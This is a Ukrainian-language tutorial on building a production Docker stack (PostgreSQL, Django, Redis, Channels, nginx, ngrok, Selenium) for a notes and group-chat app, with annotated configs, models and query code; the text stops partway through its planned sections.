# CrispyNotes — Фінальний Проєкт: Production Stack

> Цей туторіал проводить тебе через **повний production-ready стек**:
> PostgreSQL → Django → Redis → Channels → nginx → ngrok.
>
> Проєкт — `notes_chat_app` — об'єднує всі попередні модулі:
> шаблони + auth + тести + async + WebSocket + Docker + nginx.
> Ти побачиш як всі компоненти працюють разом у реальній системі.
>
> **Результат:** застосунок з PostgreSQL, груповим чатом у реальному часі,
> Selenium E2E тестами і публічним доступом через ngrok.

---

## Зміст

**Архітектура** _(читати перед кодом)_
- [01 · ОГЛЯД — що і навіщо у production стеку](#01--огляд)
- [02 · DOCKER COMPOSE — ланцюг сервісів і залежностей](#02--docker-compose)
- [03 · POSTGRESQL — від SQLite до production БД](#03--postgresql)
- [04 · REDIS + CHANNELS — channel layer для WebSocket](#04--redis--channels)
- [05 · NGINX — reverse proxy і статика](#05--nginx)
- [06 · NGROK — публічний доступ і CSRF](#06--ngrok)
- [07 · ENTRYPOINT — ланцюг запуску контейнера](#07--entrypoint)

**Моделі та доменна логіка**
- [08 · MODELS — повна схема даних](#08--models)
- [09 · SERVICES + SELECTORS — шар бізнес-логіки](#09--services--selectors)
- [10 · CONSUMERS — WebSocket груповий чат](#10--consumers)

**Тести та якість**
- [11 · ТЕСТОВА СТРАТЕГІЯ — 5 рівнів перевірки](#11--тестова-стратегія)
- [12 · SELENIUM У DOCKER — E2E через Remote WebDriver](#12--selenium-у-docker)

**Розробка та деплой**
- [13 · SEED DATA — демо-дані для розробки](#13--seed-data)
- [14 · РОЗРОБКА — workflows і команди](#14--розробка)
- [15 · PRODUCTION CHECKLIST — що перевірити перед релізом](#15--production-checklist)

---

## 01 · ОГЛЯД

> **Головне питання:** Чим `notes_chat_app` відрізняється від попередніх уроків?
>
> У попередніх уроках — SQLite, `runserver`, без nginx, без Redis.
> Тут — production стек. Та сама Django логіка, але під справжнім навантаженням.

### Компоненти production стеку

```
┌─────────────────────────────────────────────────────────────────┐
│  Інтернет (через ngrok)  ←──────────────────────────────┐       │
│                                                          │       │
│  Браузер                                                 │       │
│      │                                                   │       │
│      ▼                                                   │       │
│  nginx :80  ← SSL termination, static files             │       │
│      │                                                   │       │
│      ├── GET /static/*  →  /staticfiles/ (volume)       │       │
│      └── все інше  →  web:8001                          │       │
│                   │                                      │       │
│                   ▼                                      │       │
│           Uvicorn ASGI :8001                             │       │
│                   │                                      │       │
│           ProtocolTypeRouter                             │       │
│                   │                                      │       │
│           ├── HTTP  → Django views                       │       │
│           └── WS   → GroupChatConsumer                  │       │
│                            │                             │       │
│                            ├── PostgreSQL :5432          │       │
│                            └── Redis :6379 (channel)    │       │
│                                                          │       │
│  ngrok ─────────────────────────────────────────────────┘       │
│  Selenium :4444 ← E2E тести                                     │
└─────────────────────────────────────────────────────────────────┘
```

### Таблиця сервісів

| Сервіс | Image | Порт | Роль |
|--------|-------|------|------|
| `db` | `postgres:16-alpine` | 5432 | Реляційна БД |
| `redis` | `redis:7-alpine` | 6379 | Channel layer (WebSocket pub/sub) |
| `web` | `Dockerfile` | 8001 | Django + Uvicorn ASGI |
| `nginx` | `nginx:1.27-alpine` | 80 | Reverse proxy, static files |
| `ngrok` | `ngrok/ngrok` | 4040 | Публічний HTTPS тунель |
| `selenium` | `selenium/standalone-chrome` | 4444 | Headless Chrome для E2E |

### Чому production стек складніший

| | Dev (попередні уроки) | Production (цей урок) |
|--|----------------------|----------------------|
| **БД** | SQLite (файл) | PostgreSQL (контейнер) |
| **Сервер** | `runserver` (WSGI) | Uvicorn (ASGI) |
| **Proxy** | — | nginx (статика, WebSocket) |
| **Channel layer** | InMemory | Redis (масштабується) |
| **Публічний доступ** | — | ngrok (HTTPS тунель) |
| **Запуск** | `python manage.py runserver` | `docker compose up` |

---

## 02 · DOCKER COMPOSE

> **Ключова концепція:** health checks і `depends_on: condition: service_healthy`
> гарантують що кожен сервіс чекає готовності попереднього перед стартом.

### Повна схема залежностей

```
db (postgres)          → healthy?
    │
redis (redis)          → healthy?
    │
    └──────────────────────────┐
                               ▼
                         web (django + uvicorn)
                               │
                               → migrate
                               → collectstatic
                               → seed_demo_data (якщо SEED_DEMO_DATA=1)
                               → uvicorn start
                               │
                         web healthy?
                               │
                        nginx (reverse proxy)
                               │
                         nginx healthy?
                               │
                        ngrok (public tunnel)
                               │
                        selenium (e2e tests chrome)
```

### docker-compose.yml — детальний розбір

```yaml
services:

  # ─── PostgreSQL ──────────────────────────────────────────────────────
  db:
    image: postgres:16-alpine     # мінімальний образ (alpine = ~80 MB)
    volumes:
      - postgres_data:/var/lib/postgresql/data  # дані зберігаються між restart
    environment:
      POSTGRES_DB:       ${POSTGRES_DB}
      POSTGRES_USER:     ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
      # pg_isready: утиліта PostgreSQL — перевіряє чи приймає сервер з'єднання
      interval: 5s      # перевіряти кожні 5 сек
      retries: 5         # вважати "healthy" після 5 успішних
    networks: [app-net]

  # ─── Redis ───────────────────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]   # PONG = redis живий
      interval: 5s
    networks: [app-net]

  # ─── Web (Django) ────────────────────────────────────────────────────
  web:
    build: .             # Dockerfile у поточній директорії
    ports:
      - "8001:8001"      # прямий доступ для Selenium (тести не через nginx)
    environment:
      DATABASE_URL:  postgres://${POSTGRES_USER}:${POSTGRES_PASSWORD}@db:5432/${POSTGRES_DB}
      REDIS_URL:     redis://redis:6379/0
      SECRET_KEY:    ${SECRET_KEY}
      DEBUG:         ${DEBUG:-False}
      ALLOWED_HOSTS: ${ALLOWED_HOSTS:-localhost,127.0.0.1}
      NGROK_DOMAIN:  ${NGROK_DOMAIN}
      SEED_DEMO_DATA: ${SEED_DEMO_DATA:-0}
      WEB_HOST:      web              # для Selenium Docker network
      SELENIUM_REMOTE_URL: http://selenium:4444/wd/hub
    volumes:
      - staticfiles:/app/staticfiles   # web пише → nginx читає
    depends_on:
      db:    {condition: service_healthy}
      redis: {condition: service_healthy}
    healthcheck:
      test: >
        python -c "import urllib.request;
        urllib.request.urlopen('http://localhost:8001/accounts/login/')"
      interval: 5s
      retries: 12
      start_period: 15s   # перший health check через 15 сек після старту
    networks: [app-net]

  # ─── Nginx ───────────────────────────────────────────────────────────
  nginx:
    image: nginx:1.27-alpine
    ports: ["80:80"]
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro   # конфіг (read-only)
      - staticfiles:/staticfiles:ro                   # статика (read-only)
    depends_on:
      web: {condition: service_healthy}
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
      interval: 10s
    networks: [app-net]

  # ─── Ngrok ───────────────────────────────────────────────────────────
  ngrok:
    image: ngrok/ngrok:latest
    command: http --url=${NGROK_DOMAIN} nginx:80
    # ↑ тунель з публічного URL до nginx всередині Docker мережі
    environment:
      NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
    ports: ["4040:4040"]   # ngrok dashboard (traffic inspector)
    depends_on:
      nginx: {condition: service_healthy}
    networks: [app-net]

  # ─── Selenium ────────────────────────────────────────────────────────
  selenium:
    image: selenium/standalone-chrome:latest
    ports:
      - "4444:4444"    # WebDriver API (використовується test_selenium.py)
      - "7900:7900"    # VNC (можна переглянути браузер живцем: http://localhost:7900)
    shm_size: '2g'     # Chrome потребує shared memory
    networks: [app-net]

# ─── Named volumes ───────────────────────────────────────────────────────
volumes:
  postgres_data:    # PostgreSQL дані (зберігаються між docker compose down/up)
  staticfiles:      # Django collectstatic output (web → nginx)

# ─── Named network ───────────────────────────────────────────────────────
networks:
  app-net:
    driver: bridge
    # Явна мережа гарантує DNS резолюцію між контейнерами:
    # "nginx" → IP nginx контейнера, "redis" → IP redis контейнера, тощо
    # Без явної мережі ngrok може не знайти "nginx" → ERR_NGROK_8012
```

### Чому важливий `start_period` у healthcheck

```
start_period: 15s  для web:

  0s   → контейнер стартував
  0–15s → entrypoint.sh: migrate + collectstatic + seed_demo_data
         Healthcheck не враховується! (не вважається failure)
  15s  → починаються реальні перевірки кожні 5s
  60s  → якщо всі 12 спроб провалились → сервіс "unhealthy"
         nginx не стартує (depends_on: service_healthy)

Без start_period: healthcheck рахує 12 спроб з першої секунди.
Якщо migrate займає 10с → nginx намагається стартувати → 503 → ngrok не може достукатись.
```

---

## 03 · POSTGRESQL

> **Ключова відмінність від SQLite:** PostgreSQL — окремий сервіс у мережі.
> Django з'єднується через `DATABASE_URL` (dj-database-url парсить рядок з'єднання).

### Як Django підключається до PostgreSQL

```python
# settings.py
import dj_database_url
import os

DATABASE_URL = os.environ.get('DATABASE_URL')

if DATABASE_URL:
    # Production: PostgreSQL у Docker
    DATABASES = {'default': dj_database_url.parse(DATABASE_URL)}
    # dj_database_url.parse перетворює:
    # 'postgres://notes_user:pass@db:5432/notes_db'
    # в:
    # {'ENGINE': 'django.db.backends.postgresql',
    #  'HOST': 'db', 'PORT': '5432', 'NAME': 'notes_db',
    #  'USER': 'notes_user', 'PASSWORD': 'pass'}
else:
    # Dev/CI: SQLite (не потребує сервера)
    DATABASES = {'default': {'ENGINE': 'django.db.backends.sqlite3',
                             'NAME': BASE_DIR / 'db.sqlite3'}}
```

### Чому не SQLite у production

| | SQLite | PostgreSQL |
|--|--------|-----------|
| **Конкурентний запис** | Один writer, блокування файлу | MVCC — тисячі writers |
| **WebSocket + ORM** | Конфлікти при concurrent WS | Немає конфліктів |
| **Транзакції** | Обмежені | Повна ACID + SERIALIZABLE |
| **Indexing** | Базові | GIN, GiST, часткові індекси |
| **Масштаб** | ~100K рядків зручно | Мільярди рядків |
| **Docker** | Файл у контейнері (втрачається!) | Окремий сервіс + volume |

**Критична проблема SQLite у Docker:**

```
Без named volume:
  docker compose down → контейнер видаляється → db.sqlite3 видаляється
  docker compose up   → нова БД → всі дані втрачені!

З PostgreSQL + named volume:
  docker compose down → контейнер видаляється → postgres_data volume залишається
  docker compose up   → PostgreSQL підключається до volume → дані збереглись
```

### Міграції у Docker

```bash
# Автоматично при старті (entrypoint.sh):
python manage.py migrate --noinput

# Вручну (якщо треба застосувати без перезапуску):
docker compose exec web python manage.py migrate

# Перевірити стан міграцій:
docker compose exec web python manage.py showmigrations

# Підключитись до PostgreSQL напряму:
docker compose exec db psql -U notes_user -d notes_db

# Переглянути таблиці:
\dt
\d notes_app_note    # схема конкретної таблиці
```

### CONN_MAX_AGE — persistent connections

```python
# settings.py
DATABASES = {
    'default': {
        ...,
        'CONN_MAX_AGE': 0,  # async-compatible: 0 = нові з'єднання кожен раз
    }
}
# CONN_MAX_AGE > 0 потребує thread-local storage → несумісний з async views
# При ASGI/Uvicorn → CONN_MAX_AGE = 0 (Django рекомендація)
```

---

## 04 · REDIS + CHANNELS

> **Проблема InMemoryChannelLayer:** він зберігає повідомлення в RAM одного процесу.
> Якщо запустити 2 uvicorn worker-и → вони не бачать один одного → broadcast не дійде.
> Redis channel layer вирішує це через shared pub/sub.

### Як RedisChannelLayer реалізує broadcast

```
Worker 1 (Consumer Віктора)          Worker 2 (Consumer Олі)
┌────────────────────────┐           ┌────────────────────────┐
│  group_send(            │           │                        │
│    "chat_group_7", ... │──────────►│  Redis pub/sub         │
│  )                      │           │  channel: chat_group_7 │
└────────────────────────┘           │         │              │
                                     │         ▼              │
                                     │  chat_message()        │
                                     │  send() → браузер Олі  │
                                     └────────────────────────┘

Redis як shared message broker:
  Publish: Consumer Віктора → Redis LPUSH chat_group_7_msgs ...
  Subscribe: Consumer Олі  ← Redis BRPOP chat_group_7_msgs
```

### Налаштування channel layer

```python
# settings.py
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,
                    # socket_timeout=None: без обмеження на читання
                    # (важливо для довготривалих WS з'єднань!)
                    "socket_timeout": None,
                    "socket_connect_timeout": 5,
                    # health_check_interval: Redis пінгує кожні 30 сек
                    # щоб виявити і відновити обірвані з'єднання
                    "health_check_interval": 30,
                }],
            },
        }
    }
else:
    # Локальний dev без Docker — InMemory (одночасно один процес)
    CHANNEL_LAYERS = {
        "default": {"BACKEND": "channels.layers.InMemoryChannelLayer"}
    }
```

**Чому `socket_timeout=None` критично:**

```
Проблема без socket_timeout=None:

  GroupChatConsumer.receive()
    → channel_layer.group_send()   ← публікує в Redis
    → channel_layer підписується на відповідь

  Redis відповідає через brpop_timeout=5 секунд
  Але якщо socket_timeout=5 (або менше) у Redis client:
    client-side timeout < server brpop timeout
    → redis.exceptions.TimeoutError
    → ASGI application ERROR
    → WebSocket з'єднання падає

  Симптом: nginx лог показує 101 (WS upgrade), потім через хвилину:
    "Exception in ASGI application → TimeoutError reading from redis:6379"

  Рішення: socket_timeout=None → читання без обмеження часу
  brpop_timeout на сервері (5 сек) є природним лімітом
```

### daphne перший у INSTALLED_APPS

```python
# settings.py
INSTALLED_APPS = [
    'daphne',    # ← ПЕРШИМ! Override runserver → ASGI замість WSGI
    'channels',
    'django.contrib.admin',
    # ...
    'notes_app',
]

ASGI_APPLICATION = 'notes_project.asgi.application'
```

**Що відбувається якщо daphne НЕ перший:**

```bash
python manage.py runserver
# → Django використовує вбудований WSGI server
# → WebSocket URL /ws/... → 404
# → GroupChatConsumer недосяжний
# → Груповий чат не працює

python manage.py runserver
# + daphne перший:
# → daphne override runserver command
# → ASGI server з asyncio event loop
# → WebSocket + HTTP одночасно ✓
```

---

## 05 · NGINX

> **Nginx як reverse proxy:** браузер не підключається до Uvicorn напряму.
> Nginx приймає з'єднання, термінує SSL, роздає статику, проксує решту.

### Архітектура nginx у цьому стеку

```
Браузер → nginx:80 → routing:

  GET /static/css/main.css
    → alias /staticfiles/css/main.css   ← з тома, без Django
    → 200 з Cache-Control: max-age=604800

  GET /notes/
    → proxy_pass http://web:8001/notes/  ← HTTP до Uvicorn
    → Django view → HTML → nginx → браузер

  WebSocket UPGRADE /ws/groups/7/chat/
    → proxy_http_version 1.1
    → proxy_set_header Upgrade $http_upgrade    ← ОБОВ'ЯЗКОВО!
    → proxy_set_header Connection $connection_upgrade
    → proxy_pass http://web:8001/ws/groups/7/chat/
    → Uvicorn ASGI → GroupChatConsumer → persistent
```

### nginx.conf — повний з коментарями

```nginx
worker_processes auto;   # auto = кількість CPU cores

events {
    worker_connections 1024;   # одночасних з'єднань на один worker process
    # 2 cores × 1024 = 2048 одночасних з'єднань
}

http {
    include /etc/nginx/mime.types;   # .css → text/css, .js → application/javascript

    # ── WebSocket Upgrade handling ────────────────────────────────────────────
    # $http_upgrade = заголовок "Upgrade" від браузера ("websocket" або "")
    # Якщо браузер надсилає Upgrade: websocket → $connection_upgrade = "upgrade"
    # Якщо звичайний HTTP запит (Upgrade = "") → $connection_upgrade = "close"
    map $http_upgrade $connection_upgrade {
        default upgrade;
        ""      close;
    }

    # ── Upstream: Django/Uvicorn ──────────────────────────────────────────────
    upstream django {
        server web:8001;   # "web" — DNS ім'я сервісу в Docker network app-net
        # Можна додати кілька: server web2:8001; → load balancing
    }

    server {
        listen 80;
        # У production: listen 443 ssl; + ssl_certificate

        client_max_body_size 10M;   # максимальний розмір upload (форми з файлами)

        # ── Статичні файли (nginx роздає напряму) ────────────────────────────
        location /static/ {
            alias /staticfiles/;   # volume з collectstatic (web → nginx)
            expires 7d;            # браузер кешує 7 днів
            add_header Cache-Control "public, immutable";
            # "immutable": браузер не перевіряє freshness (файли мають hash в іменах)
        }

        # ── Все інше → Uvicorn ───────────────────────────────────────────────
        location / {
            proxy_pass http://django;

            # Реальний IP клієнта (Django бачить nginx IP без цих заголовків):
            proxy_set_header Host              $host;
            proxy_set_header X-Real-IP         $remote_addr;
            proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # ── WEBSOCKET UPGRADE (критично!) ─────────────────────────────
            proxy_http_version 1.1;
            # ↑ WebSocket вимагає HTTP/1.1 (connection keep-alive)
            # Без цього nginx downgrade до HTTP/1.0 → Upgrade заголовки ігноруються
            # → WS handshake fails → браузер отримує 400 або 101 а потім одразу close

            proxy_set_header Upgrade    $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            # ↑ Передаємо Upgrade: websocket і Connection: upgrade до Uvicorn
            # Uvicorn бачить ці заголовки → перемикає протокол → ASGI WS scope

            proxy_read_timeout 300s;    # WS-з'єднання може жити 5 хвилин без активності
            proxy_connect_timeout 75s;  # ліміт на встановлення з'єднання до upstream
            proxy_send_timeout 300s;    # ліміт на відправку відповіді клієнту
        }
    }
}
```

### Як staticfiles потрапляє до nginx

```
1. Dockerfile COPY . .
   → весь проєкт у /app/

2. entrypoint.sh:
   python manage.py collectstatic --noinput
   → Django збирає всі static файли в STATIC_ROOT (/app/staticfiles/)
   → CSS з crispy_forms, JS, admin, icons — все в одному місці

3. docker-compose.yml:
   web:   volumes: - staticfiles:/app/staticfiles   ← web WRITES here
   nginx: volumes: - staticfiles:/staticfiles:ro    ← nginx READS here (read-only!)

4. nginx.conf:
   location /static/ { alias /staticfiles/; }      ← nginx → volume → файл

→ GET /static/admin/css/base.css
  → nginx → /staticfiles/admin/css/base.css
  → 200 без Python!
```

---

## 06 · NGROK

> **Навіщо ngrok:** `localhost:80` недоступний з інтернету.
> ngrok створює публічний HTTPS URL що тунелює до твого nginx.

### ngrok в Docker Compose

```yaml
ngrok:
  image: ngrok/ngrok:latest
  command: http --url=${NGROK_DOMAIN} nginx:80
  # ↑ "http" = HTTP тунель (ngrok додає HTTPS з боку клієнта)
  # --url: фіксований домен (потрібен ngrok Pro або static domain)
  # nginx:80 = куди перенаправляти трафік (Docker internal DNS)
  environment:
    NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
  ports:
    - "4040:4040"   # ngrok web UI: inspect HTTP traffic
  depends_on:
    nginx: {condition: service_healthy}   # чекаємо nginx
```

### Проблема: CSRF + ngrok

**Симптом:** відкрив `https://my-domain.ngrok-free.app/accounts/login/`, ввів credentials → `403 Forbidden: CSRF verification failed`.

**Діагностика:** ngrok додає заголовок `Origin: https://my-domain.ngrok-free.app`. Django перевіряє `CSRF_TRUSTED_ORIGINS`. Якщо домену там немає → 403.

```python
# settings.py
_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')

CSRF_TRUSTED_ORIGINS = (
    [f'https://{_ngrok_domain}']
    if _ngrok_domain else []
)
# CSRF_TRUSTED_ORIGINS = ['https://fawn-natural-mayfly.ngrok-free.app']

# Також треба дозволити домен в ALLOWED_HOSTS:
_allowed = os.environ.get('ALLOWED_HOSTS', 'localhost,127.0.0.1')
ALLOWED_HOSTS = [h.strip() for h in _allowed.split(',')]
# + додати ngrok домен:
if _ngrok_domain:
    ALLOWED_HOSTS.append(_ngrok_domain)
```

**В docker-compose.yml:**

```yaml
web:
  environment:
    NGROK_DOMAIN: ${NGROK_DOMAIN}   # передаємо з .env в контейнер
```

**В .env:**

```bash
NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app
NGROK_AUTHTOKEN=2abc123_your_real_token_here
```

### Проблема: ERR_NGROK_8012 — no such host nginx

**Симптом:** ngrok запускається, але показує `ERR_NGROK_8012: failed to connect to upstream: no such host nginx`.

**Причина:** ngrok контейнер не знаходить nginx за DNS ім'ям. Зазвичай через відсутність shared network.

```yaml
# Рішення: явна named network у ВСІХ сервісів
networks:
  app-net:
    driver: bridge

services:
  nginx:
    networks: [app-net]
  ngrok:
    networks: [app-net]   # ← обидва в app-net → DNS резолюція "nginx" ✓
```

### ngrok dashboard

```
http://localhost:4040   ← ngrok web UI

Дозволяє:
  - Переглядати всі HTTP запити через тунель в реальному часі
  - Бачити заголовки запиту і відповіді
  - Бачити тіло запиту (JSON, форми)
  - Replay запитів (відтворити той самий POST ще раз)
  - Перевірити CSRF token у cookie і POST body

Корисно для дебагу CSRF: відкрий Inspector → POST /accounts/login/
  → Cookies: csrftoken=<value>
  → Body: csrfmiddlewaretoken=<value>
  → Чи вони збігаються?
```

---

## 07 · ENTRYPOINT

> **entrypoint.sh** — shell скрипт що виконується при кожному `docker compose up`.
> Він запускає підготовчі кроки і потім uvicorn.

```sh
#!/bin/sh
set -e   # зупинитись при будь-якій помилці (exit code ≠ 0)
# Без set -e: uvicorn стартує навіть якщо migrate провалилась → 500 на всіх запитах

echo "=== Running migrations ==="
python manage.py migrate --noinput
# --noinput: не питати підтвердження в інтерактивному режимі
# Застосовує всі нові міграції з попередньої версії коду

echo "=== Collecting static files ==="
python manage.py collectstatic --noinput
# Збирає static з усіх installed apps у STATIC_ROOT (/app/staticfiles)
# Потрібно при кожному deploy (якщо змінились CSS/JS)

echo "=== Seeding demo data (if enabled) ==="
if [ "${SEED_DEMO_DATA}" = "1" ]; then
    python manage.py seed_demo_data --force
    # --force: без підтвердження, навіть якщо БД не порожня
fi

echo "=== Starting uvicorn ==="
exec python -m uvicorn notes_project.asgi:application \
    --host 0.0.0.0 \
    --port 8001 \
    --reload
    # --reload: авто-перезапуск при зміні файлів (ТІЛЬКИ ДЛЯ DEV!)
    # У production: прибрати --reload + додати --workers 4

# exec: замінює shell процес uvicorn'ом
# Без exec: shell → uvicorn як child process
# SIGTERM від Docker → shell → shell може ігнорувати → uvicorn не отримує сигнал
# З exec: SIGTERM → uvicorn → graceful shutdown ✓
```

**Ланцюг `set -e` у дії:**

```
✅ Нормальний запуск:
  migrate OK → collectstatic OK → seed OK → uvicorn START

❌ Якщо migrate провалилась (наприклад, PostgreSQL ще не ready):
  migrate FAIL (exit 1) → set -e → shell EXIT
  entrypoint повертає exit 1
  → Docker: контейнер вийшов з помилкою → "Exited (1)"
  → nginx НЕ стартує (depends_on: service_healthy)
  → Зрозуміла помилка в логах замість таємничих 500
```

---

## 08 · MODELS

> **Схема даних notes_app:** 10 таблиць, 4 рівні зв'язків.

### ER-діаграма

```
┌──────────────────────────────────────────────────────────────────────────┐
│  auth_user (Django вбудований)                                            │
│  id, username, email, password (PBKDF2), is_active, is_staff...           │
└──────────┬────────────────────────────────────────────────────────────────┘
           │ 1:1
           ▼
┌──────────────────┐
│   UserProfile    │
│──────────────────│
│ user (OneToOne)  │
│ bio (TextField)  │
│ avatar (URL)     │
└──────────────────┘

           │ (auth_user)
           │ 1:N ──────────────────────────────────────────────────────────
           ▼                                                                │
┌──────────────────────┐     1:N    ┌───────────────────┐                  │
│       Notebook       │◄──────────►│       Note        │                  │
│──────────────────────│            │───────────────────│                  │
│ user (FK→User)       │            │ user (FK→User)    │                  │
│ title (200)          │            │ notebook (FK SET)  │                  │
│ color (#hex)         │            │ group (FK SET_NULL)│                  │
│ is_default (bool)    │            │ title (200)       │                  │
└──────────────────────┘            │ content (text)    │                  │
                                    │ priority (1-4)    │◄─────── M:N ───► Tag
                                    │ is_pinned (bool)  │                  │
                                    │ is_archived (bool)│                  │
                                    │ created_at (auto) │                  │
                                    │ updated_at (auto) │                  │
                                    └───────────┬───────┘                  │
                                                │ 1:N                       │
                                                ▼                          │
                                    ┌───────────────────┐                  │
                                    │     Reminder      │                  │
                                    │───────────────────│                  │
                                    │ note (FK CASCADE)  │                  │
                                    │ remind_at (DT)    │                  │
                                    │ is_sent (bool)    │                  │
                                    └───────────────────┘                  │
                                                                           │
           │ (auth_user)                                                   │
           │ 1:N                                                           │
           ▼                                                               ▼
┌──────────────────────┐     1:N    ┌──────────────────────┐   ┌──────────────────┐
│       TodoList       │◄──────────►│      TodoItem        │   │       Tag        │
│──────────────────────│            │──────────────────────│   │──────────────────│
│ user (FK)            │            │ todo_list (FK CASCADE)│   │ user (FK)        │
│ title (200)          │            │ text (500)            │   │ name (50)        │
│ is_completed (bool)  │            │ is_done (bool)        │   │ color (#hex)     │
└──────────────────────┘            │ due_date (date/null)  │   │ unique (user,name)│
                                    │ position (int)        │   └──────────────────┘
                                    └──────────────────────┘

           │ (auth_user)
           │ 1:N
           ▼
┌──────────────────────┐     1:N    ┌──────────────────────┐
│    ShoppingList      │◄──────────►│     ShopItem         │
│──────────────────────│            │──────────────────────│
│ user (FK)            │            │ shopping_list (FK CASCADE)│
│ group (FK SET_NULL)  │            │ name (200)            │
│ title (200)          │            │ quantity (pos.int)    │
│ store (100)          │            │ is_bought (bool)      │
└──────────────────────┘            │ position (int)        │
                                    └──────────────────────┘

  auth_group (Django вбудований)
  ↕ M:N з auth_user (через auth_user_groups)
  ↕ FK від Note.group і ShoppingList.group

  ChatMessage
  ┌──────────────────┐
  │   ChatMessage    │
  │──────────────────│
  │ group (FK CASCADE)│  ← group видалений → чат видалений
  │ author (FK SET_NULL)│ ← author видалений → msg анонімний
  │ content (text)   │
  │ timestamp (auto) │
  └──────────────────┘
```

### Ключові рішення у моделях

**Note.priority — validators vs CheckConstraint:**

```python
class Note(models.Model):
    PRIORITY_CHOICES = [(1, 'Низький'), (2, 'Середній'), (3, 'Високий'), (4, 'Критичний')]

    priority = models.PositiveSmallIntegerField(
        default=1,
        validators=[MinValueValidator(1), MaxValueValidator(4)],
        # ↑ validators: спрацьовують при full_clean() і ModelForm
        # НЕ спрацьовують при .objects.create() або .save() напряму!
    )

    class Meta:
        constraints = [
            models.CheckConstraint(
                check=Q(priority__gte=1) & Q(priority__lte=4),
                name='note_priority_range',
            )
        ]
        # ↑ CheckConstraint: БД-рівень валідація (PostgreSQL CHECK constraint)
        # Спрацьовує при БУДЬ-ЯКОМУ INSERT/UPDATE, навіть через raw SQL
        # Захист "останньої лінії оборони"
```

**Note.group FK — SET_NULL vs CASCADE:**

```python
group = models.ForeignKey(
    Group,
    on_delete=models.SET_NULL,   # ← НЕ CASCADE!
    null=True, blank=True,
    related_name='notes',
)
# SET_NULL: група видалена → нотатка залишається, group=NULL
# CASCADE:  група видалена → ВСІ нотатки групи видаляються!
#           Юзер видаляє групу → втрачає свої нотатки → rage quit

# Тест що документує і захищає цю поведінку:
def test_note_group_becomes_null_when_group_deleted(self):
    group = Group.objects.create(name='Family')
    note = Note.objects.create(user=self.user, title='Test', group=group)
    group.delete()
    note.refresh_from_db()
    self.assertIsNone(note.group)  # SET_NULL спрацював
```

**unique_together vs UniqueConstraint:**

```python
class Tag(models.Model):
    name = models.CharField(max_length=50)
    user = models.ForeignKey(User, on_delete=models.CASCADE)

    class Meta:
        # Стара версія (deprecating):
        # unique_together = [('user', 'name')]

        # Нова версія (Django 4+):
        constraints = [
            models.UniqueConstraint(
                fields=['user', 'name'],
                name='tag_unique_per_user',
            )
        ]
        # Бізнес-правило: 'python' може існувати у Alice І у Bob
        # Але не може бути двох 'python' у одного юзера
```

**ChatMessage — автор може бути видалений:**

```python
class ChatMessage(models.Model):
    group = models.ForeignKey(
        Group,
        on_delete=models.CASCADE,    # ← CASCADE! Група = контекст чату
        related_name='messages',
    )
    author = models.ForeignKey(
        User,
        on_delete=models.SET_NULL,   # ← SET_NULL: юзер видалений → msg стає анонімним
        null=True,
        related_name='chat_messages',
    )
    content = models.TextField()
    timestamp = models.DateTimeField(auto_now_add=True)
    # auto_now_add: встановлюється автоматично при CREATE, не змінюється

    class Meta:
        ordering = ['timestamp']   # хронологічний порядок за замовчуванням
        indexes = [
            models.Index(fields=['group', 'timestamp']),
            # ↑ Composite index для швидкого отримання повідомлень групи
            # GROUP BY group, ORDER BY timestamp → index scan замість seq scan
        ]
```

---

## 09 · SERVICES + SELECTORS

> **Паттерн:** views — тонкі. Вся логіка у двох шарах.
> Selectors — тільки читання (SELECT). Services — мутації (INSERT/UPDATE/DELETE).

### Архітектура шарів

```
HTTP Request
    │
    ▼
views.py  ← тонкий шар: auth, form validation, redirect
    │
    ├── selectors.py  ← тільки SELECT, повертає QuerySet або list
    └── services.py   ← INSERT/UPDATE/DELETE, бізнес-логіка

selectors.py і services.py НЕ імпортують один одного.
Тільки views.py використовує обох.
```

### selectors.py — ключові запити

```python
# notes_app/selectors.py
from django.db.models import Q, Count, Prefetch
from .models import Note, Notebook, Tag, ChatMessage


def get_user_notes(user, *, archived=False, notebook=None, tag=None, search=None):
    """
    Повертає нотатки юзера + нотатки груп де він є членом.

    SELECT n.* FROM note n
    LEFT JOIN auth_user_groups ug ON ug.group_id = n.group_id
    WHERE (n.user_id = %s OR ug.user_id = %s)
    AND n.is_archived = %s
    [AND n.notebook_id = %s]
    [AND n.tags CONTAINS %s]
    [AND (n.title ILIKE %s OR n.content ILIKE %s)]
    ORDER BY n.is_pinned DESC, n.priority DESC, n.updated_at DESC
    """
    user_groups = user.groups.all()   # prefetch groups (один SQL)

    qs = Note.objects.filter(
        Q(user=user) | Q(group__in=user_groups),
        is_archived=archived,
    ).select_related(
        'notebook',    # JOIN notebook → без N+1 при відображенні кольору записника
        'group',       # JOIN group → без N+1 при відображенні назви групи
    ).prefetch_related(
        'tags',        # IN tags → без N+1 при відображенні тегів
    )

    if notebook is not None:
        qs = qs.filter(notebook=notebook)
    if tag is not None:
        qs = qs.filter(tags=tag)
    if search:
        qs = qs.filter(
            Q(title__icontains=search) | Q(content__icontains=search)
        )

    return qs.order_by('-is_pinned', '-priority', '-updated_at')


def get_user_notebooks(user):
    """Записники юзера з кількістю нотаток (для sidebar)."""
    return Notebook.objects.filter(user=user).annotate(
        note_count=Count('notes', filter=Q(notes__is_archived=False))
        # annotate: додає поле note_count до кожного об'єкта QuerySet
        # filter всередині Count: тільки не архівовані
        # Без filter: рахує всі нотатки включно з архівом
    ).order_by('-is_default', 'title')


def get_user_tags(user):
    """Теги юзера для sidebar і форм."""
    return Tag.objects.filter(user=user).order_by('name')


